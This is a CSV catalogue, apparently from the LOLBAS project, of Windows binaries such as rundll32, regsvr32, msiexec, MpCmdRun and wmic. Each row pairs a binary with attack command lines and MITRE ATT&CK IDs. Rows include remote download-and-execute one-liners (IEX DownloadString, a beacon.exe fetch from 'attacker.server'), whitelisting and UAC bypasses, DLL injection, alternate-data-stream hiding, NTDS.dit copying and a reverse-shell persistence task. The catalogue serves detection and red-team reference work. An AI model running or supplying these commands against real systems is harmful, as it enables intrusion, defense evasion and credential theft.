Category,Name,Description,Created,Command,Command Description,Command Category,Command Usecase,Command Privileges,Command OperatingSystem,Command MitreID
OSBinaries,Msdt.exe,Microsoft diagnostics tool,2018-05-25,msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af C:\PCW8E57.xml /skip TRUE,Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the PCW8E57.xml file.,Execute,Execute code,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218
OSBinaries,Msdt.exe,Microsoft diagnostics tool,2018-05-25,msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af C:\PCW8E57.xml /skip TRUE,Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the PCW8E57.xml file.,AWL bypass,Execute code bypass Application whitelisting,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218
OSBinaries,WorkFolders.exe,Work Folders,2021-08-16,WorkFolders,Execute control.exe in the current working directory,Execute,Can be used to evade defensive countermeasures or to hide as a persistence mechanism,User,"Windows 8, Windows 8.1, Windows 10",T1218
OSBinaries,Diskshadow.exe,Diskshadow.exe is a tool that exposes the functionality offered by the volume shadow copy Service (VSS).,2018-05-25,diskshadow.exe /s c:\test\diskshadow.txt,Execute commands using diskshadow.exe from a prepared diskshadow script.,Dump,Use diskshadow to exfiltrate data from VSS such as NTDS.dit,User,Windows server,T1003.003
OSBinaries,Diskshadow.exe,Diskshadow.exe is a tool that exposes the functionality offered by the volume shadow copy Service (VSS).,2018-05-25,diskshadow> exec calc.exe,Execute commands using diskshadow.exe to spawn child process,Execute,Use diskshadow to bypass defensive counter measures,User,Windows server,T1202
OSBinaries,Extrac32.exe,,2018-05-25,extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe,Extracts the source CAB file into an Alternate Data Stream (ADS) of the target file.,ADS,Extract data from cab file and hide it in an alternate data stream.,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1564.004
OSBinaries,Extrac32.exe,,2018-05-25,extrac32 \\webdavserver\webdav\file.cab c:\ADS\file.txt:file.exe,Extracts the source CAB file on an unc path into an Alternate Data Stream (ADS) of the target file.,ADS,Extract data from cab file and hide it in an alternate data stream.,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1564.004
OSBinaries,Extrac32.exe,,2018-05-25,extrac32 /Y /C \\webdavserver\share\test.txt C:\folder\test.txt,Copy the source file to the destination file and overwrite it.,Download,Download file from UNC/WEBDav,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1105
OSBinaries,Extrac32.exe,,2018-05-25,extrac32.exe /C C:\Windows\System32\calc.exe C:\Users\user\Desktop\calc.exe,Command for copying calc.exe to another folder,Copy,Copy file,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1105
OSBinaries,Eventvwr.exe,Displays Windows Event Logs in a GUI window.,2018-11-01,eventvwr.exe,"During startup, eventvwr.exe checks the registry value HKCU\Software\Classes\mscfile\shell\open\command for the location of mmc.exe, which is used to open the eventvwr.msc saved console file. If the location of another binary or script is added to this registry value, it will be executed as a high-integrity process without a UAC prompt being displayed to the user.",UAC bypass,Execute a binary or script as a high-integrity process without a UAC prompt.,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1548.002
OSBinaries,Mavinject.exe,Used by App-v in Windows,2018-05-25,MavInject.exe 3110 /INJECTRUNNING c:\folder\evil.dll,Inject evil.dll into a process with PID 3110.,Execute,Inject dll file into running process,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218.013
OSBinaries,Mavinject.exe,Used by App-v in Windows,2018-05-25,"Mavinject.exe 4172 /INJECTRUNNING ""c:\ads\file.txt:file.dll""",Inject file.dll stored as an Alternate Data Stream (ADS) into a process with PID 4172,ADS,Inject dll file into running process,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1564.004
OSBinaries,Regasm.exe,Part of .NET,2018-05-25,regasm.exe AllTheThingsx64.dll,Loads the target .DLL file and executes the RegisterClass function.,AWL bypass,Execute code and bypass Application whitelisting,Local Admin,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218.009
OSBinaries,Regasm.exe,Part of .NET,2018-05-25,regasm.exe /U AllTheThingsx64.dll,Loads the target .DLL file and executes the UnRegisterClass function.,Execute,Execute code and bypass Application whitelisting,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218.009
OSBinaries,Gpscript.exe,Used by group policy to process scripts,2018-05-25,Gpscript /logon,Executes logon scripts configured in Group Policy.,Execute,Add local group policy logon script to execute file and hide from defensive counter measures,Administrator,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218
OSBinaries,Gpscript.exe,Used by group policy to process scripts,2018-05-25,Gpscript /startup,Executes startup scripts configured in Group Policy,Execute,Add local group policy logon script to execute file and hide from defensive counter measures,Administrator,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218
OSBinaries,Rundll32.exe,Used by Windows to execute dll files,2018-05-25,"rundll32.exe AllTheThingsx64,EntryPoint",AllTheThingsx64 would be a .DLL file and EntryPoint would be the name of the entry point in the .DLL file to execute.,Execute,Execute dll file,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218.011
OSBinaries,Rundll32.exe,Used by Windows to execute dll files,2018-05-25,"rundll32.exe \\10.10.10.10\share\payload.dll,EntryPoint",Use Rundll32.exe to execute a DLL from a SMB share. EntryPoint is the name of the entry point in the .DLL file to execute.,Execute,Execute DLL from SMB share.,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218.011
OSBinaries,Rundll32.exe,Used by Windows to execute dll files,2018-05-25,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();new%20ActiveXObject(""WScript.Shell"").Run(""powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');""",Use Rundll32.exe to execute a JavaScript script that runs a PowerShell script that is downloaded from a remote web site.,Execute,Execute code from Internet,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218.011
OSBinaries,Rundll32.exe,Used by Windows to execute dll files,2018-05-25,"rundll32.exe javascript:""\..\mshtml.dll,RunHTMLApplication "";eval(""w=new%20ActiveXObject(\""WScript.Shell\"");w.run(\""calc\"");window.close()"");",Use Rundll32.exe to execute a JavaScript script that runs calc.exe.,Execute,Proxy execution,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218.011
OSBinaries,Rundll32.exe,Used by Windows to execute dll files,2018-05-25,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();h=new%20ActiveXObject(""WScript.Shell"").run(""calc.exe"",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(""WScript.Shell"").Run(""cmd /c taskkill /f /im rundll32.exe"",0,true);}",Use Rundll32.exe to execute a JavaScript script that runs calc.exe and then kills the Rundll32.exe process that was started.,Execute,Proxy execution,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218.011
OSBinaries,Rundll32.exe,Used by Windows to execute dll files,2018-05-25,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test"")",Use Rundll32.exe to execute a JavaScript script that calls a remote JavaScript script.,Execute,Execute code from Internet,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218.011
OSBinaries,Rundll32.exe,Used by Windows to execute dll files,2018-05-25,"rundll32 ""C:\ads\file.txt:ADSDLL.dll"",DllMain",Use Rundll32.exe to execute a .DLL file stored in an Alternate Data Stream (ADS).,ADS,Execute code from alternate data stream,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1564.004
OSBinaries,Rundll32.exe,Used by Windows to execute dll files,2018-05-25,rundll32.exe -sta {CLSID},Use Rundll32.exe to load a registered or hijacked COM Server payload.  Also works with ProgID.,Execute,Execute a DLL/EXE COM server payload or ScriptletURL code.,User,Windows 10 (and likely previous versions),T1218.011
OSBinaries,Regsvr32.exe,Used by Windows to register dlls,2018-05-25,regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll,Execute the specified remote .SCT script with scrobj.dll.,AWL bypass,"Execute code from remote scriptlet, bypass Application whitelisting",User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218.010
OSBinaries,Regsvr32.exe,Used by Windows to register dlls,2018-05-25,regsvr32.exe /s /u /i:file.sct scrobj.dll,Execute the specified local .SCT script with scrobj.dll.,AWL bypass,"Execute code from scriptlet, bypass Application whitelisting",User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218.010
OSBinaries,Regsvr32.exe,Used by Windows to register dlls,2018-05-25,regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll,Execute the specified remote .SCT script with scrobj.dll.,Execute,"Execute code from remote scriptlet, bypass Application whitelisting",User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218.010
OSBinaries,Regsvr32.exe,Used by Windows to register dlls,2018-05-25,regsvr32.exe /s /u /i:file.sct scrobj.dll,Execute the specified local .SCT script with scrobj.dll.,Execute,"Execute code from scriptlet, bypass Application whitelisting",User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218.010
OSBinaries,Regedit.exe,Used by Windows to manipulate registry,2018-05-25,regedit /E c:\ads\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey,Export the target Registry key to the specified .REG file.,ADS,Hide registry data in alternate data stream,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1564.004
OSBinaries,Regedit.exe,Used by Windows to manipulate registry,2018-05-25,regedit C:\ads\file.txt:regfile.reg,Import the target .REG file into the Registry.,ADS,Import hidden registry data from alternate data stream,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1564.004
OSBinaries,Msiexec.exe,Used by Windows to execute msi files,2018-05-25,msiexec /quiet /i cmd.msi,Installs the target .MSI file silently.,Execute,Execute custom made msi file with attack code,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218.007
OSBinaries,Msiexec.exe,Used by Windows to execute msi files,2018-05-25,msiexec /q /i http://192.168.100.3/tmp/cmd.png,Installs the target remote & renamed .MSI file silently.,Execute,Execute custom made msi file with attack code from remote server,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218.007
OSBinaries,Msiexec.exe,Used by Windows to execute msi files,2018-05-25,"msiexec /y ""C:\folder\evil.dll""",Calls DLLRegisterServer to register the target DLL.,Execute,Execute dll files,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218.007
OSBinaries,Msiexec.exe,Used by Windows to execute msi files,2018-05-25,"msiexec /z ""C:\folder\evil.dll""",Calls DLLRegisterServer to un-register the target DLL.,Execute,Execute dll files,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218.007
OSBinaries,GfxDownloadWrapper.exe,"Remote file download used by the Intel Graphics Control Panel, receives as first parameter a URL and a destination file path.",2019-12-27,"C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_[0-9]+\GfxDownloadWrapper.exe ""URL"" ""DESTINATION FILE""","GfxDownloadWrapper.exe downloads the content that returns URL and writes it to the file DESTINATION FILE PATH. The binary is signed by ""Microsoft Windows Hardware"", ""Compatibility Publisher"", ""Microsoft Windows Third Party Component CA 2012"", ""Microsoft Time-Stamp PCA 2010"", ""Microsoft Time-Stamp Service"".",Download,Download file from internet,User,Windows 10,T1105
OSBinaries,wuauclt.exe,Windows Update Client,2020-09-23,wuauclt.exe /UpdateDeploymentProvider Full_Path_To_DLL /RunHandlerComServer,Full_Path_To_DLL would be the abosolute path to .DLL file and would execute code on attach.,Execute,Execute dll via attach/detach methods,User,Windows 10,T1218
OSBinaries,Presentationhost.exe,File is used for executing Browser applications,2018-05-25,Presentationhost.exe C:\temp\Evil.xbap,Executes the target XAML Browser Application (XBAP) file,Execute,Execute code within xbap files,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218
OSBinaries,Regini.exe,Used to manipulate the registry,2020-07-03,regini.exe newfile.txt:hidden.ini,Write registry keys from data inside the Alternate data stream.,ADS,Write to registry,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1564.004
OSBinaries,MpCmdRun.exe,Binary part of Windows Defender. Used to manage settings in Windows Defender,2020-03-20,MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\temp\\beacon.exe,"Download file to specified path - Slashes work as well as dashes (/DownloadFile, /url, /path)",Download,Download file,User,Windows 10,T1105
OSBinaries,MpCmdRun.exe,Binary part of Windows Defender. Used to manage settings in Windows Defender,2020-03-20,"copy ""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe"" C:\Users\Public\Downloads\MP.exe && chdir ""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\"" && ""C:\Users\Public\Downloads\MP.exe"" -DownloadFile -url https://attacker.server/beacon.exe -path C:\Users\Public\Downloads\evil.exe","Download file to specified path - Slashes work as well as dashes (/DownloadFile, /url, /path) [updated version to bypass Windows 10 mitigation]",Download,Download file,User,Windows 10,T1105
OSBinaries,MpCmdRun.exe,Binary part of Windows Defender. Used to manage settings in Windows Defender,2020-03-20,MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\temp\\nicefile.txt:evil.exe,Download file to machine and store it in Alternate Data Stream,ADS,Hide downloaded data inton an Alternate Data Stream,User,Windows 10,T1564.004
OSBinaries,Wmic.exe,The WMI command-line (WMIC) utility provides a command-line interface for WMI,2018-05-25,"wmic.exe process call create ""c:\ads\file.txt:program.exe""",Execute a .EXE file stored as an Alternate Data Stream (ADS),ADS,Execute binary file hidden in Alternate data streams to evade defensive counter measures,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1564.004
OSBinaries,Wmic.exe,The WMI command-line (WMIC) utility provides a command-line interface for WMI,2018-05-25,wmic.exe process call create calc,Execute calc from wmic,Execute,Execute binary from wmic to evade defensive counter measures,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218
OSBinaries,Wmic.exe,The WMI command-line (WMIC) utility provides a command-line interface for WMI,2018-05-25,"wmic.exe process call create ""C:\Windows\system32\reg.exe add \""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe\"" /v \""Debugger\"" /t REG_SZ /d \""cmd.exe\"" /f""","Add cmd.exe as a debugger for the osk.exe process. Each time osk.exe is run, cmd.exe will be run as well.",Execute,Execute binary by manipulate the debugger for a program to evade defensive counter measures,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218
OSBinaries,Wmic.exe,The WMI command-line (WMIC) utility provides a command-line interface for WMI,2018-05-25,"wmic.exe /node:""192.168.0.1"" process call create ""evil.exe""",Execute evil.exe on the remote system.,Execute,Execute binary on a remote system,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218
OSBinaries,Wmic.exe,The WMI command-line (WMIC) utility provides a command-line interface for WMI,2018-05-25,"wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create ""at 9:00PM c:\GoogleUpdate.exe ^> c:\notGoogleUpdateResults.txt""",Create a scheduled execution of C:\GoogleUpdate.exe to run at 9pm.,Execute,Execute binary with scheduled task created with wmic on a remote computer,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218
OSBinaries,Wmic.exe,The WMI command-line (WMIC) utility provides a command-line interface for WMI,2018-05-25,"wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create ""cmd /c vssadmin create shadow /for=C:\Windows\NTDS\NTDS.dit > c:\not_the_NTDS.dit""",Create a volume shadow copy of NTDS.dit that can be copied.,Execute,Execute binary on remote system,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218
OSBinaries,Wmic.exe,The WMI command-line (WMIC) utility provides a command-line interface for WMI,2018-05-25,"wmic.exe process get brief /format:""https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl""",Create a volume shadow copy of NTDS.dit that can be copied.,Execute,Execute binary on remote system,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218
OSBinaries,Wmic.exe,The WMI command-line (WMIC) utility provides a command-line interface for WMI,2018-05-25,"wmic.exe process get brief /format:""\\127.0.0.1\c$\Tools\pocremote.xsl""",Executes JScript or VBScript embedded in the target remote XSL stylsheet.,Execute,Execute script from remote system,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218
OSBinaries,Runonce.exe,,2018-05-25,Runonce.exe /AlternateShellStartup,Executes a Run Once Task that has been configured in the registry,Execute,"Persistence, bypassing defensive counter measures",Administrator,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218
OSBinaries,SyncAppvPublishingServer.exe,Used by App-v to get App-v server lists,2018-05-25,"SyncAppvPublishingServer.exe ""n;(New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX""",Example command on how inject Powershell code into the process,Execute,Use SyncAppvPublishingServer as a Powershell host to execute Powershell code. Evade defensive counter measures,User,"Windows 10 1709, Windows 10 1703, Windows 10 1607",T1218
OSBinaries,Verclsid.exe,,2018-12-04,verclsid.exe /S /C {CLSID},Used to verify a COM object before it is instantiated by Windows Explorer,Execute,Run a com object created in registry to evade defensive counter measures,User,Windows 10,T1218.012
OSBinaries,Psr.exe,"Windows Problem Steps Recorder, used to record screen and clicks.",2020-06-27,psr.exe /start /output D:\test.zip /sc 1 /gui 0,"Record a user screen without creating a GUI. You should use ""psr.exe /stop"" to stop recording and create output file.",Reconnaissance,Can be used to take screenshots of the user environment,User,since Windows 7 (client) / Windows 2008 R2,T1113
OSBinaries,Infdefaultinstall.exe,Binary used to perform installation based on content inside inf files,2018-05-25,InfDefaultInstall.exe Infdefaultinstall.inf,Executes SCT script using scrobj.dll from a command in entered into a specially prepared INF file.,Execute,Code execution,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218
OSBinaries,Explorer.exe,Binary used for managing files and system components within Windows,2020-06-24,"explorer.exe /root,""C:\Windows\System32\calc.exe""",Execute calc.exe with the parent process spawning from a new instance of explorer.exe,Execute,"Performs execution of specified file with explorer parent process breaking the process tree, can be used for defense evasion.",User,"Windows XP, Windows 7, Windows 8, Windows 8.1, Windows 10",T1202
OSBinaries,Explorer.exe,Binary used for managing files and system components within Windows,2020-06-24,explorer.exe C:\Windows\System32\notepad.exe,Execute calc.exe with the parent process spawning from a new instance of explorer.exe,Execute,"Performs execution of specified file with explorer parent process breaking the process tree, can be used for defense evasion.",User,Windows 10 (Tested),T1202
OSBinaries,Expand.exe,Binary that expands one or more compressed files,2018-05-25,expand \\webdav\folder\file.bat c:\ADS\file.bat,Copies source file to destination.,Download,Use to copies the source file to the destination file,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1105
OSBinaries,Expand.exe,Binary that expands one or more compressed files,2018-05-25,expand c:\ADS\file1.bat c:\ADS\file2.bat,Copies source file to destination.,Copy,Copies files from A to B,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1105
OSBinaries,Expand.exe,Binary that expands one or more compressed files,2018-05-25,expand \\webdav\folder\file.bat c:\ADS\file.txt:file.bat,Copies source file to destination Alternate Data Stream (ADS),ADS,Copies files from A to B,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1564.004
OSBinaries,Installutil.exe,The Installer tool is a command-line utility that allows you to install and uninstall server resources by executing the installer components in specified assemblies,2018-05-25,InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll,Execute the target .NET DLL or EXE.,AWL bypass,Use to execute code and bypass application whitelisting,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218.004
OSBinaries,Installutil.exe,The Installer tool is a command-line utility that allows you to install and uninstall server resources by executing the installer components in specified assemblies,2018-05-25,InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll,Execute the target .NET DLL or EXE.,Execute,Use to execute code and bypass application whitelisting,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218.004
OSBinaries,Netsh.exe,Netsh is a Windows tool used to manipulate network interface settings.,2019-12-24,netsh.exe add helper C:\Users\User\file.dll,"Use Netsh in order to execute a .dll file and also gain persistence, every time the netsh command is called",Execute,Proxy execution of .dll,User,"Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1546.007
OSBinaries,Wab.exe,Windows address book manager,2018-05-25,wab.exe,Change HKLM\Software\Microsoft\WAB\DLLPath and execute DLL of choice,Execute,Execute dll file. Bypass defensive counter measures,Administrator,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218
OSBinaries,Dnscmd.exe,A command-line interface for managing DNS servers,2018-05-25,dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\192.168.0.149\dll\wtf.dll,Adds a specially crafted DLL as a plug-in of the DNS Service. This command must be run on a DC by a user that is at least a member of the DnsAdmins group. See the reference links for DLL details.,Execute,Remotely inject dll to dns server,DNS admin,Windows server,T1543.003
OSBinaries,At.exe,Schedule periodic tasks,2019-09-20,"C:\Windows\System32\at.exe at 09:00 /interactive /every:m,t,w,th,f,s,su C:\Windows\System32\revshell.exe",Create a recurring task to execute every day at a specific time.,Execute,"Create a recurring task, to eg. to keep reverse shell session(s) alive",Local Admin,Windows 7 or older,T1053.002
OSBinaries,Pcalua.exe,Program Compatibility Assistant,2018-05-25,pcalua.exe -a calc.exe,Open the target .EXE using the Program Compatibility Assistant.,Execute,Proxy execution of binary,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1202
OSBinaries,Pcalua.exe,Program Compatibility Assistant,2018-05-25,pcalua.exe -a \\server\payload.dll,Open the target .DLL file with the Program Compatibilty Assistant.,Execute,Proxy execution of remote dll file,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1202
OSBinaries,Pcalua.exe,Program Compatibility Assistant,2018-05-25,pcalua.exe -a C:\Windows\system32\javacpl.cpl -c Java,Open the target .CPL file with the Program Compatibility Assistant.,Execute,Execution of CPL files,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1202
OSBinaries,Cmdkey.exe,"creates, lists, and deletes stored user names and passwords or credentials.",2018-05-25,cmdkey /list,List cached credentials,Credentials,Get credential information from host,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1078
OSBinaries,Msconfig.exe,"MSConfig is a troubleshooting tool which is used to temporarily disable or re-enable software, device drivers or Windows services that run during startup process to help the user determine the cause of a problem with Windows",2018-05-25,Msconfig.exe -5,Executes command embeded in crafted c:\windows\system32\mscfgtlc.xml.,Execute,Code execution using Msconfig.exe,Administrator,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218
OtherMSBinaries,Mftrace.exe,Trace log generation tool for Media Foundation Tools.,2018-05-25,Mftrace.exe cmd.exe,Launch cmd.exe as a subprocess of Mftrace.exe.,Execute,Local execution of cmd.exe as a subprocess of Mftrace.exe.,User,Windows,T1127
OtherMSBinaries,Mftrace.exe,Trace log generation tool for Media Foundation Tools.,2018-05-25,Mftrace.exe powershell.exe,Launch cmd.exe as a subprocess of Mftrace.exe.,Execute,Local execution of powershell.exe as a subprocess of Mftrace.exe.,User,Windows,T1127
OtherMSBinaries,Tracker.exe,Tool included with Microsoft .Net Framework.,2018-05-25,Tracker.exe /d .\calc.dll /c C:\Windows\write.exe,Use tracker.exe to proxy execution of an arbitrary DLL into another process. Since tracker.exe is also signed it can be used to bypass application whitelisting solutions.,Execute,Injection of locally stored DLL file into target process.,User,Windows,T1127
OtherMSBinaries,Tracker.exe,Tool included with Microsoft .Net Framework.,2018-05-25,Tracker.exe /d .\calc.dll /c C:\Windows\write.exe,Use tracker.exe to proxy execution of an arbitrary DLL into another process. Since tracker.exe is also signed it can be used to bypass application whitelisting solutions.,AWL Bypass,Injection of locally stored DLL file into target process.,User,Windows,T1127
OtherMSBinaries,Dotnet.exe,dotnet.exe comes with .NET Framework,2019-11-12,dotnet.exe [PATH_TO_DLL],dotnet.exe will execute any dll even if applocker is enabled.,AWL Bypass,N/A,User,Windows 7 and up with .NET installed,T1218
OtherMSBinaries,Dotnet.exe,dotnet.exe comes with .NET Framework,2019-11-12,dotnet.exe [PATH_TO_DLL],dotnet.exe will execute any DLL.,Execute,Execute DLL,User,Windows 7 and up with .NET installed,T1218
OtherMSBinaries,Dotnet.exe,dotnet.exe comes with .NET Framework,2019-11-12,dotnet.exe msbuild [Path_TO_XML_CSPROJ],dotnet.exe with msbuild (SDK Version) will execute unsigned code,AWL Bypass,N/A,User,Windows 10 with .NET Core installed,T1218
OtherMSBinaries,VSIISExeLauncher.exe,Binary will execute specified binary. Part of VS/VScode installation.,2021-09-24,"VSIISExeLauncher.exe -p [PATH_TO_BIN] -a ""argument here""",The above binary will execute other binary.,Execute,Execute any binary with given arguments.,User,Windows 10 and up with VS/VScode installed,T1218
OtherMSBinaries,SQLToolsPS.exe,Tool included with Microsoft SQL that loads SQL Server cmdlts. A replacement for sqlps.exe. Successor to sqlps.exe in SQL Server 2016+.,2018-05-25,SQLToolsPS.exe -noprofile -command Start-Process calc.exe,Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging.,Execute,Execute PowerShell command.,User,Windows,T1218
OtherMSBinaries,Dxcap.exe,DirectX diagnostics/debugger included with Visual Studio.,2018-05-25,Dxcap.exe -c C:\Windows\System32\notepad.exe,Launch notepad as a subprocess of Dxcap.exe,Execute,Local execution of a process as a subprocess of Dxcap.exe,User,Windows,T1127
OtherMSBinaries,Appvlp.exe,Application Virtualization Utility Included with Microsoft Office 2016,2018-05-25,AppVLP.exe \\webdav\calc.bat,Executes calc.bat through AppVLP.exe,Execute,Execution of BAT file hosted on Webdav server.,User,Windows 10 w/Office 2016,T1218
OtherMSBinaries,Appvlp.exe,Application Virtualization Utility Included with Microsoft Office 2016,2018-05-25,"AppVLP.exe powershell.exe -c ""$e=New-Object -ComObject shell.application;$e.ShellExecute('calc.exe','', '', 'open', 1)""",Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.,Execute,Local execution of process bypassing Attack Surface Reduction (ASR).,User,Windows 10 w/Office 2016,T1218
OtherMSBinaries,Appvlp.exe,Application Virtualization Utility Included with Microsoft Office 2016,2018-05-25,"AppVLP.exe powershell.exe -c ""$e=New-Object -ComObject excel.application;$e.RegisterXLL('\\webdav\xll_poc.xll')""",Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.,Execute,Local execution of process bypassing Attack Surface Reduction (ASR).,User,Windows 10 w/Office 2016,T1218
OtherMSBinaries,dnx.exe,.Net Execution environment file included with .Net.,2018-05-25,dnx.exe consoleapp,Execute C# code located in the consoleapp folder via 'Program.cs' and 'Project.json' (Note - Requires dependencies),Execute,Local execution of C# project stored in consoleapp folder.,User,Windows,T1127
OtherMSBinaries,msxsl.exe,Command line utility used to perform XSL transformations.,2018-05-25,msxsl.exe customers.xml script.xsl,Run COM Scriptlet code within the script.xsl file (local).,Execute,Local execution of script stored in XSL file.,User,Windows,T1218
OtherMSBinaries,msxsl.exe,Command line utility used to perform XSL transformations.,2018-05-25,msxsl.exe customers.xml script.xsl,Run COM Scriptlet code within the script.xsl file (local).,AWL Bypass,Local execution of script stored in XSL file.,User,Windows,T1218
